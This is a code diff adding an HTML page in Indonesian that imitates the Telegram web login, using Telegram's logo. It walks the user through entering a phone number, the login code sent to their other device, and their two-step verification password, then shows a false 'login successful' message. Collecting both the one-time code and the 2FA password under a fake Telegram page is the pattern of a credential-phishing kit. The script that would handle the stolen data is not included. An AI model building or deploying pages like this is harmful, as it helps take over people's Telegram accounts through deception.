@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login dengan Telegram</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div id="loading" class="loading-spinner" style="display: none"></div>
+    <div class="container" id="phone-form">
+        <div class="logo">
+            <img src="https://web.telegram.org/a/monkey.a3d5fcdc50b18dc55695.svg" alt="Telegram Logo" />
+        </div>
+        <h1>Telegram</h1>
+        <p>Harap konfirmasi kode negara Anda dan masukkan nomor telepon Anda.</p>
+        <form onsubmit="showCodeConfirmation(event)">
+            <label for="country">Negara</label>
+            <select id="country" onchange="updatePhoneNumber()">
+                <option value="+62">Indonesia (+62)</option>
+                <!-- Tambahkan opsi negara lain jika perlu -->
+            </select>
+
+            <label for="phone-number">Nomor telepon Anda</label>
+            <div class="phone-input">
+                <span id="country-code">+62</span>
+                <input type="text" id="phone-number" placeholder="Your phone number" required />
+            </div>
+
+            <div class="checkbox-container">
+                <input type="checkbox" id="keep-signed-in" checked />
+                <label for="keep-signed-in">Biarkan saya tetap masuk</label>
+            </div>
+
+            <button type="submit">Continue</button>
+        </form>
+    </div>
+
+    <div class="container" id="code-confirmation" style="display: none;">
+        <div class="logo">
+            <img src="https://web.telegram.org/a/monkey.a3d5fcdc50b18dc55695.svg" alt="Avatar" style="width: 80px" />
+        </div>
+        <p>Kami telah mengirimkan kode ke aplikasi Telegram di perangkat Anda yang lain.</p>
+        <form onsubmit="showPasswordConfirmation(event)">
+            <label for="verification-code">Kode</label>
+            <input type="text" id="verification-code" placeholder="Enter code" required />
+            <button type="submit">Verify</button>
+        </form>
+    </div>
+
+    <div class="container" id="password-confirmation" style="display: none;">
+        <div class="logo">
+            <img src="https://web.telegram.org/a/monkey.a3d5fcdc50b18dc55695.svg" alt="Avatar" style="width: 80px" />
+        </div>
+        <h2>Masukkan password</h2>
+        <p>Anda mengaktifkan Verifikasi Dua Langkah, sehingga akun Anda terlindungi dengan kata sandi tambahan.</p>
+        <form onsubmit="redirectToTelegram(event)">
+            <label for="password">Password</label>
+            <div class="password-input">
+                <input type="password" id="password" placeholder="Enter password" required />
+                <button type="button" id="toggle-visibility" onclick="togglePasswordVisibility()">Tampilkan Password</button>
+            </div>
+
+            <button type="submit">Login</button>
+        </form>
+    </div>
+
+    <div id="popup" class="popup" style="display: none;">
+        <div class="popup-content">
+            <h2>Login Sukses</h2>
+            <p>Anda berhasil login. Anda akan diarahkan ke Telegram sekarang.</p>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
